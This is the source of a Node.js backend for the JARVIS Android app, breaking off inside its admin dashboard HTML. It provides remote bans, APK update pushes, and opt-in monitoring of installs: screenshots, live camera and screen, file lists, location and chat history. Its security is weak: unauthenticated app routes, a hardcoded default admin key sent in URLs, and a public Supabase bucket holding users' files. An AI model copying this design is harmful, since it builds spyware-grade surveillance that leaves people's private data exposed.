// JARVIS backend — v2
// Zero dependencies: only Node.js built-ins (node:http, node:fs, node:path, node:crypto).
// Run:  node server.js        (PORT and ADMIN_KEY come from env)
// Deploy: Render Blueprint (render.yaml) — no build step. Auto-deploys from GitHub main.
//
// What it does (owner control panel for the JARVIS Android app):
//   - Devices heartbeat in with a random per-device install_id; the server
//     records first_seen / last_seen / device / app version / last action.
//   - One-click Ban / Suspend / Shutdown / Restore per install, and per DEVICE
//     (device_id = SHA-256 of the phone's Android ID, so one ban covers every
//     install on that phone).
//   - Remote config: the owner can turn Jarvis features on/off, add extra
//     instructions (persona_extra), post an announcement, and publish a new
//     app version + APK URL — every install picks it up on its next heartbeat
//     and offers the update (one tap to install; Android never allows a truly
//     silent install for sideloaded apps).
//   - Monitoring (CONSENT ONLY): if the app user turns ON "Owner monitoring"
//     in Jarvis Settings, the app also sends recent activity, which permissions
//     it granted, recent chat history, and — only when the owner requests it —
//     one screenshot. Nothing is collected from a user who did not opt in.
//   - The app is local-first: if this backend is unreachable, Jarvis keeps
//     working normally on-device. A heartbeat answer of "banned" /
//     "suspended" / "shutdown" is the only thing that stops it.
//
// Storage: data/users.json, data/devices.json, data/config.json (plain JSON),
// data/screenshots/<install_id>.jpg (latest screenshot per install).
// Render's free disk is ephemeral — data resets on redeploy / restart.
// A real database (Render Postgres / Supabase) is the upgrade path.
//
// Auth: heartbeat / event / history / screenshot / config-read have NO auth
// by design — install_id is a random per-device UUID. Admin routes are
// protected by ADMIN_KEY (env). Default key "jarvis-admin-123" exists only
// for local testing — the dashboard shows a loud warning while it is in use.

const http = require("node:http");
const https = require("node:https");
const fs = require("node:fs");
const path = require("node:path");
const crypto = require("node:crypto");

const PORT = parseInt(process.env.PORT || "3000", 10);
const ADMIN_KEY = process.env.ADMIN_KEY || "jarvis-admin-123";
const DEFAULT_KEY = "jarvis-admin-123";
const USING_DEFAULT_KEY = ADMIN_KEY === DEFAULT_KEY;
// Email notifications (optional): set RESEND_API_KEY + RESEND_FROM in env.
// Free Resend account sends to your own verified email; add a domain to mail anyone.
const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
const RESEND_FROM = process.env.RESEND_FROM || "Jarvis <onboarding@resend.dev>";
const EMAIL_CONFIGURED = RESEND_API_KEY.length > 0;

const DATA_DIR = path.join(__dirname, "data");
const USERS_FILE = path.join(DATA_DIR, "users.json");
const DEVICES_FILE = path.join(DATA_DIR, "devices.json");
const CONFIG_FILE = path.join(DATA_DIR, "config.json");
const SHOTS_DIR = path.join(DATA_DIR, "screenshots");
const CAM_DIR = path.join(DATA_DIR, "camera");
const FILELIST_DIR = path.join(DATA_DIR, "filelists");
const FILES_DIR = path.join(DATA_DIR, "files");
const PAIRS_FILE = path.join(DATA_DIR, "pairs.json");
const RELAY_DIR = path.join(DATA_DIR, "relay");
const VOICE_DIR = path.join(DATA_DIR, "voice");
const RELAY_FILE_DIR = path.join(DATA_DIR, "relay-files");
const RESULTS_DIR = path.join(DATA_DIR, "results");
// v1.7.0: Telegram bot control — token Render env var-e (TELEGRAM_BOT_TOKEN).
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TG_API = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN;
function tgSend(chatId, text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  const body = JSON.stringify({ chat_id: chatId, text: String(text).slice(0, 4000) });
  const u = new URL(TG_API + "/sendMessage");
  const r = https.request(u, { method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } }, (res) => { res.resume(); });
  r.on("error", () => {});
  r.end(body);
}
function logResult(fromId, text) {
  fs.mkdirSync(RESULTS_DIR, { recursive: true });
  const f = path.join(RESULTS_DIR, safeId(fromId) + ".json");
  const arr = loadJson(f, []);
  arr.push({ at: new Date().toISOString(), text: String(text || "").slice(0, 2000) });
  while (arr.length > 20) arr.shift();
  saveJson(f, arr);
}
function loadResults(id) { return loadJson(path.join(RESULTS_DIR, safeId(id) + ".json"), []); }
const PC_SCREEN_DIR = path.join(DATA_DIR, "pc-screen");
const MAX_BODY = 2_000_000; // 2 MB — screenshots are base64 JPEGs

const DEFAULT_CONFIG = {
  features: {}, // tool name -> false means the owner turned that feature OFF
  persona_extra: "",
  announcement: "",
  latest_version: "",
  latest_version_code: 0,
  apk_url: "",
  supabase_url: "", // admin override for the Supabase file gallery (else taken from a phone's heartbeat)
  supabase_key: "", // admin override — anon key only, NEVER the service_role key
  telegram_chats: [], // Telegram bot allowlist — chat ids (strings) jara /devices + /phone + /pc use korte parbe
  screenshot_requested: {}, // install_id -> true (consumed when the app uploads)
  camera_requested: {}, // install_id -> true (consumed when the app uploads a photo)
  live_camera: {}, // install_id -> true (admin live preview — app uploads a photo every ~3s while set)
  live_screen: {}, // install_id -> true (admin live screen — app uploads a screenshot every ~3s while set)
  file_list_requested: {}, // install_id -> true (consumed when the app uploads its file list)
  live_video: {}, // install_id -> true (admin Agora live video — app publishes camera+screen video while set)
  messages: [], // {id, target: "all" | install_id, title, body, at} — shown as a notification on the phone
};

// ---------------------------------------------------------------- storage

function loadJson(file, fallback) {
  try {
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {
    return fallback;
  }
}

function saveJson(file, obj) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const tmp = file + "." + crypto.randomBytes(6).toString("hex") + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(obj, null, 2));
  fs.renameSync(tmp, file);
}

function loadUsers() { return loadJson(USERS_FILE, {}); }
function saveUsers(u) { saveJson(USERS_FILE, u); }
function loadDevices() { return loadJson(DEVICES_FILE, {}); }
function saveDevices(d) { saveJson(DEVICES_FILE, d); }
function loadConfig() { return Object.assign({}, DEFAULT_CONFIG, loadJson(CONFIG_FILE, {})); }
function saveConfig(c) { saveJson(CONFIG_FILE, c); }
function loadPairs() { return loadJson(PAIRS_FILE, {}); }
function savePairs(x) { saveJson(PAIRS_FILE, x); }
function safeId(s) { return String(s || "").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 64); }
// Relay queue: one JSON file per recipient id (pc_id or install_id), cap 50 msgs.
function relayPath(who) { return path.join(RELAY_DIR, safeId(who) + ".json"); }
function loadQueue(who) { return loadJson(relayPath(who), []); }
function saveQueue(who, q) { saveJson(relayPath(who), q); }
function pushRelay(who, msg) {
  const q = loadQueue(who);
  q.push(msg);
  while (q.length > 50) q.shift();
  saveQueue(who, q);
  return msg.id;
}

// ---------------------------------------------------------------- status

function effectiveStatus(user, devices) {
  // Device ban wins over the install's own status.
  const dev = user.device_id && devices[user.device_id];
  if (dev) {
    if (dev.status === "banned") return "banned";
    if ((dev.status === "suspended" || dev.status === "shutdown") && dev.until) {
      if (new Date(dev.until).getTime() > Date.now()) return dev.status;
    } else if (dev.status === "suspended" || dev.status === "shutdown") {
      return dev.status;
    }
  }
  if ((user.status === "suspended" || user.status === "shutdown") && user.until) {
    if (new Date(user.until).getTime() <= Date.now()) return "ok";
  }
  return user.status || "ok";
}

function statusMessage(user, devices) {
  const st = effectiveStatus(user, devices);
  const until = (user.device_id && devices[user.device_id] && devices[user.device_id].until) || user.until;
  if (st === "banned") return "This install has been banned by the owner.";
  if (st === "suspended") return "Jarvis is suspended until " + (until || "further notice") + ".";
  if (st === "shutdown") return "Jarvis has been shut down by the owner" + (until ? " until " + until : " permanently") + ".";
  return "Jarvis is running normally.";
}

function publicUser(user, devices) {
  return {
    install_id: user.install_id,
    device_id: user.device_id || "",
    device_model: user.device_model || "",
    app_version: user.app_version || "",
    first_seen: user.first_seen,
    last_seen: user.last_seen,
    status: effectiveStatus(user, devices),
    until: user.until || null,
    device_status: (user.device_id && devices[user.device_id]) ? devices[user.device_id].status : "ok",
    last_action: user.last_action || "",
    monitoring: !!user.monitoring,
    permissions: user.permissions || {},
    recent_activity: user.recent_activity || [],
    events: user.events || [],
    history_count: (user.history || []).length,
    last_screenshot_at: user.last_screenshot_at || null,
    last_camera_at: user.last_camera_at || null,
    files: user.files || [],
    email: user.email || "",
    supabase_url: user.supabase_url || "",
    supabase_key: user.supabase_key || "",
  };
}

// ---- Agora RTC token (AccessToken2, "007") — pure Node crypto, no deps.
// token = "007" + base64(sig + packU32(crcCh) + packU32(crcUid) + msg)
//   — NO length prefixes: sig and msg go in RAW (v1.4.9 bug: packBytes() added a
//   U16 length before sig and msg, so Agora could not parse the token and
//   joinChannel failed with CAN_NOT_GET_GATEWAY_SERVER "can not find appid").
// msg = packU32(salt) + packU32(ts) + packMapU32({1: ts})   (1 = kJoinChannel)
// sig = HMAC-SHA256(appCertificate, appId + channel + uidStr + msg)
const CRC_TABLE = (() => {
  const t = new Int32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    t[n] = c;
  }
  return t;
})();
function crc32(buf) {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
}
function packU32(x) { const b = Buffer.alloc(4); b.writeUInt32LE(x >>> 0, 0); return b; }
function packU16(x) { const b = Buffer.alloc(2); b.writeUInt16LE(x & 0xFFFF, 0); return b; }
function packBytes(b) { return Buffer.concat([packU16(b.length), b]); }
function packMapU32(map) {
  const parts = [packU16(Object.keys(map).length)];
  for (const k of Object.keys(map)) parts.push(packU16(Number(k)), packU32(map[k]));
  return Buffer.concat(parts);
}
function buildAgoraToken(appId, appCertificate, channel, uid) {
  const uidStr = uid === 0 ? "" : String(uid);
  const salt = Math.floor(Math.random() * 0xFFFFFFFF) >>> 0;
  const ts = Math.floor(Date.now() / 1000) + 24 * 3600; // 24h expiry
  const msg = Buffer.concat([packU32(salt), packU32(ts), packMapU32({ 1: ts })]);
  const sig = crypto.createHmac("sha256", appCertificate)
    .update(Buffer.concat([Buffer.from(appId, "utf8"), Buffer.from(channel, "utf8"), Buffer.from(uidStr, "utf8"), msg]))
    .digest();
  const content = Buffer.concat([sig, packU32(crc32(Buffer.from(channel, "utf8"))), packU32(crc32(Buffer.from(uidStr, "utf8"))), msg]);
  return "007" + content.toString("base64");
}

function publicConfig(cfg) {
  return {
    features: cfg.features || {},
    persona_extra: cfg.persona_extra || "",
    announcement: cfg.announcement || "",
    latest_version: cfg.latest_version || "",
    latest_version_code: cfg.latest_version_code || 0,
    apk_url: cfg.apk_url || "",
    messages: cfg.messages || [],
  };
}

function sendEmailViaResend(to, subject, text) {
  return new Promise((resolve) => {
    const payload = JSON.stringify({ from: RESEND_FROM, to: [to], subject, text });
    const req = https.request("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: "Bearer " + RESEND_API_KEY,
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload),
      },
    }, (resp) => {
      let data = "";
      resp.on("data", (c) => { data += c; });
      resp.on("end", () => resolve({ ok: resp.statusCode >= 200 && resp.statusCode < 300, status: resp.statusCode, body: data }));
    });
    req.on("error", (e) => resolve({ ok: false, status: 0, body: String(e.message || e) }));
    req.write(payload);
    req.end();
  });
}

// ---------------------------------------------------------------- helpers

function sendJson(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  });
  res.end(body);
}

function sendHtml(res, code, html) {
  res.writeHead(code, { "Content-Type": "text/html; charset=utf-8" });
  res.end(html);
}

function readJsonBody(req) {
  return new Promise((resolve, reject) => {
    let raw = "";
    req.on("data", (chunk) => {
      raw += chunk;
      if (raw.length > MAX_BODY) req.destroy();
    });
    req.on("end", () => {
      if (!raw.trim()) return resolve({});
      try {
        resolve(JSON.parse(raw));
      } catch (e) {
        reject(e);
      }
    });
    req.on("error", reject);
  });
}

function escapeHtml(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function shortId(id) {
  return String(id).slice(0, 8);
}

function fmtTime(iso) {
  if (!iso) return "—";
  try {
    return new Date(iso).toLocaleString("en-GB", { timeZone: "Asia/Kolkata" });
  } catch {
    return iso;
  }
}

function safeFileName(id) {
  return String(id).replace(/[^A-Za-z0-9-]/g, "");
}

// ---------------------------------------------------------------- dashboard

function keyFormHtml() {
  return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>JARVIS Admin</title><style>
body{font-family:system-ui,sans-serif;background:#0b0f16;color:#e6f1ff;max-width:480px;margin:80px auto;padding:0 16px}
h1{color:#22d3ee}input{width:100%;padding:12px;margin:10px 0;border-radius:8px;border:1px solid #334155;background:#111827;color:#fff;font-size:16px}
button{padding:12px 20px;border:0;border-radius:8px;background:#22d3ee;color:#04222a;font-weight:700;cursor:pointer;font-size:16px}
p{color:#9fb3d1}
</style></head><body>
<h1>JARVIS Admin</h1>
<p>Enter the admin key to see installs and control Jarvis.</p>
<form method="get" action="/admin">
<input type="password" name="key" placeholder="Admin key" autofocus>
<button type="submit">Open dashboard</button>
</form></body></html>`;
}

function dashboardHtml(users, devices, cfg, key) {
  const list = Object.values(users);
  const now = Date.now();
  const total = list.length;
  const active24h = list.filter((u) => u.last_seen && now - new Date(u.last_seen).getTime() < 24 * 3600 * 1000).length;
  const banned = list.filter((u) => effectiveStatus(u, devices) === "banned").length;
  const paused = list.filter((u) => ["suspended", "shutdown"].includes(effectiveStatus(u, devices))).length;
  const monitored = list.filter((u) => u.monitoring).length;

  const disabledTools = Object.keys(cfg.features || {}).filter((t) => cfg.features[t] === false);

  // v1.5.0: Supabase gallery — config override first, else the first phone that reported its Supabase connection
  const sbFromUser = list.find((u) => u.supabase_url && u.supabase_key);
  const SB_URL = (cfg.supabase_url && cfg.supabase_key) ? cfg.supabase_url : (sbFromUser ? sbFromUser.supabase_url : "");
  const SB_KEY = (cfg.supabase_url && cfg.supabase_key) ? cfg.supabase_key : (sbFromUser ? sbFromUser.supabase_key : "");

  const targetOpts = ['<option value="all">🌍 All users</option>'].concat(
    list.map((u) => `<option value="${escapeHtml(u.install_id)}">${escapeHtml(u.device_model || "Unknown")} · ${escapeHtml(shortId(u.install_id))}${u.email ? " · " + escapeHtml(u.email) : ""}</option>`)
  ).join("");

  const cards = list
    .sort((a, b) => new Date(b.last_seen || 0) - new Date(a.last_seen || 0))
    .map((u) => {
      const st = effectiveStatus(u, devices);
      const badge =
        st === "ok" ? '<span class="ok">● OK</span>'
        : st === "banned" ? '<span class="bad">● BANNED</span>'
        : st === "suspended" ? '<span class="warn">● SUSPENDED</span>'
        : '<span class="warn">● SHUTDOWN</span>';
      const until = u.until && st !== "ok" ? " <small>until " + escapeHtml(fmtTime(u.until)) + "</small>" : "";
      const devStatus = (u.device_id && devices[u.device_id]) ? devices[u.device_id].status : "ok";
      const perms = Object.entries(u.permissions || {});
      const permChips = perms.length
        ? perms.map(([n, ok]) => `<span class="chip ${ok ? "on" : "off"}">${escapeHtml(n)}: ${ok ? "✓" : "✗"}</span>`).join(" ")
        : '<span class="muted">no permission report yet</span>';
      const acts = (u.recent_activity || []).slice(-5).reverse().map((a) => `<li>${escapeHtml(a)}</li>`).join("");
      const evs = (u.events || []).slice(-5).reverse().map((e) => `<li><small>${escapeHtml(fmtTime(e.at))}</small> ${escapeHtml(e.event)}${e.detail ? " — " + escapeHtml(e.detail) : ""}</li>`).join("");
      const hist = (u.history || []).slice(-20).map((m) => `<div class="msg ${escapeHtml(m.role)}"><b>${escapeHtml(m.role)}:</b> ${escapeHtml(m.text)}</div>`).join("");
      const shot = u.last_screenshot_at
        ? `<img id="screenImg-${escapeHtml(u.install_id)}" src="/api/admin/screenshot/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest screen" loading="lazy">`
        : '<p class="muted">No screenshot yet.</p>';
      const cam = u.last_camera_at
        ? `<img id="camImg-${escapeHtml(u.install_id)}" src="/api/admin/camera-photo/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest camera photo" loading="lazy">`
        : '<p class="muted">No camera photo yet.</p>';
      const fileLinks = (u.files || []).length
        ? (u.files || []).map((f) => `<li><a href="/api/admin/file/${escapeHtml(u.install_id)}/${encodeURIComponent(f)}?key=${encodeURIComponent(key)}">${escapeHtml(f)}</a></li>`).join("")
        : "";
      return `<div class="user">
<div class="uhead"><b>${escapeHtml(u.device_model || "Unknown device")}</b> ${badge}${until}
<span class="muted"> · v${escapeHtml(u.app_version || "?")} · install ${escapeHtml(shortId(u.install_id))}${u.device_id ? " · device " + escapeHtml(shortId(u.device_id)) : ""}</span></div>
<div class="muted">First seen ${escapeHtml(fmtTime(u.first_seen))} · Last seen ${escapeHtml(fmtTime(u.last_seen))}</div>
<div>Last action: <b>${escapeHtml(u.last_action || "—")}</b></div>
<div>Monitoring: ${u.monitoring ? '<span class="ok">ON — user allowed it</span>' : '<span class="muted">OFF</span>'}</div>
<div>${u.last_location ? `📍 Location: <b>${escapeHtml(u.last_location.address || (u.last_location.lat + ", " + u.last_location.lng))}</b> <span class="muted">(${escapeHtml(fmtTime(u.last_location.at))}${u.last_location.accuracy_m ? " · ±" + escapeHtml(String(u.last_location.accuracy_m)) + "m" : ""})</span> <a href="https://www.google.com/maps?q=${encodeURIComponent(u.last_location.lat + "," + u.last_location.lng)}" target="_blank">Open in Maps</a>` : '<span class="muted">📍 Location: not shared (user has location tracking OFF).</span>'}</div>
<div class="row"><b>Permissions:</b> ${permChips}</div>
${acts ? `<div><b>Recent activity:</b><ul>${acts}</ul></div>` : ""}
${evs ? `<div><b>Events:</b><ul>${evs}</ul></div>` : ""}
${hist ? `<details><summary>Chat history (${(u.history || []).length} messages)</summary><div class="hist">${hist}</div></details>` : ""}
<details><summary>Screen ${u.last_screenshot_at ? "· " + escapeHtml(fmtTime(u.last_screenshot_at)) : ""} <span id="liveBadgeScreen-${escapeHtml(u.install_id)}"></span></summary>${shot}
<p><button onclick="reqShot('${escapeHtml(u.install_id)}')">Request screenshot</button> <button onclick="reqLiveScreen('${escapeHtml(u.install_id)}')">▶ Live screen</button> <button onclick="stopLiveScreen('${escapeHtml(u.install_id)}')">⏹ Stop live</button> <span class="muted">— one screenshot, or live screen (a fresh screenshot every ~3s, not video) — only if the user allowed monitoring.</span></p></details>
<details><summary>Camera ${u.last_camera_at ? "· " + escapeHtml(fmtTime(u.last_camera_at)) : ""} <span id="liveBadge-${escapeHtml(u.install_id)}"></span></summary>${cam}
<p><button onclick="reqCam('${escapeHtml(u.install_id)}')">Request camera photo</button> <button onclick="reqLiveCam('${escapeHtml(u.install_id)}')">▶ Live preview</button> <button onclick="stopLiveCam('${escapeHtml(u.install_id)}')">⏹ Stop live</button> <span class="muted">— one photo, or live preview (a fresh photo every ~3s, not video) — only if the user allowed monitoring and camera permission.</span></p></details>
<details><summary>🎥 Live video (Agora) ${u.agora_live ? '<span class="ok">● LIVE</span>' : ""}</summary>
<p><button onclick="watchAgora('${escapeHtml(u.install_id)}')">▶ Watch live video</button> <button onclick="stopAgora('${escapeHtml(u.install_id)}')">⏹ Stop watching</button> <button onclick="reqLiveVideo('${escapeHtml(u.install_id)}')">▶ Start live video on phone</button> <button onclick="stopLiveVideo('${escapeHtml(u.install_id)}')">⏹ Stop live video</button> <span class="muted">— true live video (camera + screen) via Agora, only when the app user turned live video ON.</span></p>
<div id="agoraBox-${escapeHtml(u.install_id)}"><div id="agoraCam-${escapeHtml(u.install_id)}" style="width:100%;aspect-ratio:16/9;background:#000;border-radius:8px"></div><div id="agoraScreen-${escapeHtml(u.install_id)}" style="width:100%;aspect-ratio:16/9;background:#000;border-radius:8px;margin-top:8px"></div><div id="agoraStatus-${escapeHtml(u.install_id)}" class="muted">Not watching.</div></div></details>
${fileLinks ? `<details open><summary>Files (${(u.files || []).length})</summary><ul>${fileLinks}</ul></details>` : `<div class="muted">Files: none uploaded yet (only with monitoring ON + file permission).</div>`}
<details><summary>📂 File list ${u.last_file_list_at ? "· " + escapeHtml(fmtTime(u.last_file_list_at)) : ""}</summary>
<p><button onclick="reqFileList('${escapeHtml(u.install_id)}')">Request file list</button> <button onclick="loadFileList('${escapeHtml(u.install_id)}')">↻ Load list</button> <span class="muted">— the phone's full file list (names, sizes, dates — not contents), only if the user gave file permission and monitoring is ON.</span></p>
<div id="fileList-${escapeHtml(u.install_id)}"></div></details>
<details><summary>☁️ Supabase files (all files)</summary>
<p><button onclick="loadSbFiles('${escapeHtml(u.install_id)}')">☁️ Load Supabase files</button> <span class="muted">— phone-er sob file Supabase bucket "jarvis-files" theke direct (photo/video gallery + onno file download) — monitoring ON + file permission + Supabase configured thakle auto upload hoy.</span></p>
<div id="sbFiles-${escapeHtml(u.install_id)}"></div></details>
<div class="bigbtns">
<button class="ban" onclick="act('${escapeHtml(u.install_id)}','ban')">🚫 BAN USER</button>
<button onclick="act('${escapeHtml(u.install_id)}','restore')">↩ Restore</button>
<button class="ban" onclick="actDevice('${escapeHtml(u.install_id)}','ban_device')">📱 BAN DEVICE</button>
<button onclick="actDevice('${escapeHtml(u.install_id)}','unban_device')">↩ Unban device</button>
${st !== "ok" ? "" : `<button onclick="act('${escapeHtml(u.install_id)}','suspend',7)">Suspend 7d</button>
<button onclick="act('${escapeHtml(u.install_id)}','shutdown',30)">Shutdown 30d</button>`}
</div>
${devStatus !== "ok" ? `<div class="warnline">Device is ${escapeHtml(devStatus)} — every install on this phone is blocked.</div>` : ""}
</div>`;
    })
    .join("");

  return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>JARVIS Admin — ${total} installs</title>
<script src="https://download.agora.io/sdk/release/AgoraRTC_N.js"></script><style>
body{font-family:system-ui,sans-serif;background:#070b12;color:#e6f1ff;margin:0;padding:16px}
h1{color:#22d3ee;margin:0 0 4px}.sub{color:#9fb3d1;margin:0 0 16px}
.warnbar{background:#7c2d12;border:1px solid #f97316;color:#ffedd5;padding:12px;border-radius:8px;margin-bottom:16px}
.cards{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px}
.card{background:#111827;border:1px solid #1f2937;border-radius:12px;padding:14px 18px;min-width:130px}
.card b{font-size:26px;display:block}.card span{color:#9fb3d1;font-size:13px}
.panel{background:#0f172a;border:1px solid #1e3a5f;border-radius:12px;padding:16px;margin-bottom:16px}
.panel h2{margin:0 0 8px;color:#7dd3fc;font-size:17px}
.panel label{display:block;color:#9fb3d1;font-size:13px;margin:10px 0 4px}
.panel input,.panel textarea{width:100%;box-sizing:border-box;padding:9px;border-radius:8px;border:1px solid #334155;background:#111827;color:#fff;font-size:14px}
.panel textarea{min-height:64px}
.panel select{width:100%;box-sizing:border-box;padding:9px;border-radius:8px;border:1px solid #334155;background:#111827;color:#fff;font-size:14px}
.user{background:#111827;border:1px solid #1f2937;border-radius:14px;padding:16px;margin-bottom:14px}
.uhead{font-size:16px;margin-bottom:4px}
.ok{color:#4ade80}.bad{color:#f87171;font-weight:700}.warn{color:#fbbf24;font-weight:700}
.muted{color:#9fb3d1;font-size:13px}
.row{margin:6px 0}
.chip{display:inline-block;padding:2px 8px;border-radius:20px;font-size:12px;margin:2px;background:#1f2937}
.chip.on{color:#4ade80;border:1px solid #166534}.chip.off{color:#94a3b8;border:1px solid #475569}
ul{margin:4px 0;padding-left:18px}li{margin:2px 0}
details{margin:8px 0}summary{cursor:pointer;color:#7dd3fc}
.hist{max-height:220px;overflow:auto;background:#0b1220;border-radius:8px;padding:8px;margin-top:6px}
.msg{margin:4px 0;font-size:14px}.msg.user b{color:#7dd3fc}.msg.jarvis b{color:#fbbf24}
img{max-width:100%;border-radius:10px;border:1px solid #334155;margin-top:6px}
.bigbtns{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
.bigbtns button{padding:10px 16px;border-radius:10px;border:1px solid #334155;background:#1f2937;color:#e6f1ff;cursor:pointer;font-size:14px;font-weight:600}
.bigbtns button:hover{background:#374151}
.bigbtns button.ban{background:#7f1d1d;border-color:#b91c1c}
.bigbtns button.ban:hover{background:#991b1b}
.warnline{color:#fbbf24;margin-top:8px}
.save{padding:12px 22px;border:0;border-radius:10px;background:#22d3ee;color:#04222a;font-weight:700;cursor:pointer;font-size:15px;margin-top:12px}
</style></head><body>
<h1>🤖 JARVIS Admin</h1>
<p class="sub">One place: users, bans, remote features, online updates, activity &amp; screens (consent only).</p>
${USING_DEFAULT_KEY ? '<div class="warnbar"><b>WARNING:</b> You are using the default admin key (jarvis-admin-123). Anyone who knows it can control every install. Set a strong ADMIN_KEY environment variable on Render and redeploy.</div>' : ""}
<div class="panel"><h2>📜 Policy — plain and simple</h2>
<p><b>What the admin CAN see / do here:</b> which installs exist (device, app version, first/last seen, last action), Ban / Suspend / Shutdown one user or one whole device in one click, turn Jarvis features on/off for everyone, add instructions, post an announcement, publish an app update.</p>
<p><b>What the admin sees ONLY when the app user turned ON "Owner monitoring" in Jarvis Settings:</b> recent activity, which permissions the user granted, recent chat history, one screenshot (only when requested), one camera photo (only when requested) or live camera preview (a fresh photo every ~3s while the admin has it on — photo slideshow, not video) or live screen share (a fresh screenshot every ~3s while on) or true live video via Agora (camera + screen as real video, only while the app user turned live video ON), small text files from Jarvis's own workspace (only with file permission), the full file list (only with file permission), photos and videos auto-uploaded to Supabase (only with file permission + Supabase configured in the app), and location (only when the user turned ON location tracking).</p>
<p><b>What the admin NEVER sees / does:</b> no passwords, no OTPs, no live camera video / live screen stream (unless the user turned ON live video in Owner Monitoring), no location tracking (unless the user turned ON location tracking), no data from other apps, no silent installs (every update needs one tap on Install), no phone unlocking. If monitoring is OFF, the admin sees only the install's device, version and last action — nothing else.</p>
</div>
<div class="cards">
<div class="card"><b>${total}</b><span>Total installs</span></div>
<div class="card"><b>${active24h}</b><span>Active (last 24h)</span></div>
<div class="card"><b>${banned}</b><span>Banned</span></div>
<div class="card"><b>${paused}</b><span>Suspended / Shutdown</span></div>
<div class="card"><b>${monitored}</b><span>Monitoring ON</span></div>
</div>

<div class="panel"><h2>⚙️ Remote control — features, instructions &amp; online update</h2>
<p class="muted">Saved here, every install picks it up on its next heartbeat (within ~15 min). Turning a feature OFF hides it from the app. Publishing a new version makes every install offer the update (one tap to install).</p>
<label>Disabled features — one tool name per line (e.g. install_app, shopping, make_video). Empty = everything ON.</label>
<textarea id="cfgFeatures">${escapeHtml(disabledTools.join("\n"))}</textarea>
<label>Extra instructions for Jarvis (persona_extra) — added to every install's instructions.</label>
<textarea id="cfgPersona">${escapeHtml(cfg.persona_extra || "")}</textarea>
<label>Announcement — shown at the top of the app for every user.</label>
<input id="cfgAnnounce" value="${escapeHtml(cfg.announcement || "")}" placeholder="e.g. New update available!">
<label>Latest version name (e.g. 1.4.1)</label>
<input id="cfgVersion" value="${escapeHtml(cfg.latest_version || "")}" placeholder="1.4.1">
<label>Latest version code (number — must be higher than the installed one)</label>
<input id="cfgCode" type="number" value="${cfg.latest_version_code || ""}" placeholder="16">
<label>APK download URL for the update</label>
<input id="cfgApk" value="${escapeHtml(cfg.apk_url || "")}" placeholder="https://…/jarvis-ai-v1.4.1.apk">
<label>Supabase Project URL (optional — file gallery-r jonno; khali thakle phone-er heartbeat theke neoa hoy)</label>
<input id="cfgSbUrl" value="${escapeHtml(cfg.supabase_url || "")}" placeholder="https://xyz.supabase.co">
<label>Supabase anon key (optional — kokhono service_role key bosio na)</label>
<input id="cfgSbKey" value="${escapeHtml(cfg.supabase_key || "")}" placeholder="eyJ…">
<button class="save" onclick="saveCfg()">💾 Save remote control</button>
</div>

<div class="panel"><h2>💬 Send message / notification to users</h2>
<p class="muted">The phone shows it as a system notification on its next heartbeat (within ~15 min). No Firebase needed — the app polls the backend.</p>
<label>To</label>
<select id="msgTarget">${targetOpts}</select>
<label>Title</label>
<input id="msgTitle" placeholder="e.g. Jarvis update is here!">
<label>Message</label>
<textarea id="msgBody" placeholder="Write the message for the user…"></textarea>
<button class="save" onclick="sendMsg()">📣 Send notification</button>
<span id="msgResult" class="muted"></span>
</div>

<div class="panel"><h2>📧 Send email to users</h2>
<p class="muted">${EMAIL_CONFIGURED ? "Email is configured ✓ — sending via Resend." : "Email is NOT configured yet — set RESEND_API_KEY (free at resend.com) + RESEND_FROM in the Render service env vars and redeploy. A user's email appears here only when they set it in Jarvis Settings and turned ON Owner monitoring."}</p>
<label>To</label>
<select id="mailTarget">${targetOpts}</select>
<label>Subject</label>
<input id="mailSubject" placeholder="e.g. Important Jarvis update">
<label>Email body</label>
<textarea id="mailBody" placeholder="Write the email…"></textarea>
<button class="save" onclick="sendMail()">✉️ Send email</button>
<span id="mailResult" class="muted"></span>
</div>

${cards || '<p class="muted">No installs yet — devices appear here after their first heartbeat.</p>'}

<div class="panel"><h2>☁️ Supabase files — all users (direct gallery)</h2>
<p class="muted">Sob user-er sob file Supabase Storage bucket "jarvis-files" theke direct — photo/video gallery + document/audio/download, ekbare. Bucket Public + anon INSERT/SELECT policy thakte hobe. URL/key app-er heartbeat theke ase (monitoring ON thakle) ba Remote control-e save kora jay.</p>
<p><button onclick="loadSbAll()">☁️ Load all Supabase files</button></p>
<div id="sbAllFiles"></div></div>
<div class="panel"><h2>💻 Paired PCs (QR pairing)</h2>
<p class="muted">Phone + PC clone pairing — QR scan kore pair hoy. Paired PC gulo ekhane dekhte parbe, unpair korte parbe.</p>
